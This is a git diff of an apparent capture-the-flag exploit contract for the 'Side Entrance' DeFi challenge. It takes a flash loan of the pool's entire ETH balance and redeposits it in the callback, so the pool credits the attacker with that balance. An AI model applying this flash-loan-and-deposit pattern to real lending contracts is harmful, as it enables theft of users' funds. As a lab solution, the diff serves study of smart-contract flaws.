@@ -23,15 +23,16 @@ contract SideEntraceAttack {
                ) 
     {
         attacker = attackerAddress;
-        pool = payable(poolAddress);
+        pool = IPoolFunc(poolAddress);
         balance = address(poolAddress).balance;
         console.log("Starting flashloan %s",balance);
-        pool.functionCallWithValue(
-            abi.encodeWithSignature(
-                "flashLoan(uint256)"
-            ),
-            balance
-        );
+        // pool.functionCallWithValue(
+        //     abi.encodeWithSignature(
+        //         "flashLoan(uint256)"
+        //     ),
+        //     balance
+        // );
+        pool.flashLoan(balance);
         
         console.log("Flashloan complete %s", token.balanceOf(address(this)));
         
@@ -40,12 +41,14 @@ contract SideEntraceAttack {
     function execute() external payable{
 
         
-         pool.functionCallWithValue(
-            abi.encodeWithSignature(
-                "deposit()"
-            ),
-            msg.value
-        );
+         pool.deposit{value:msg.value}();
+         
+        //  (
+        //     abi.encodeWithSignature(
+        //         "deposit()"
+        //     ),
+        //     msg.value
+        // );
                 //address(pool).deposit().sendValue(amount);
     }
 
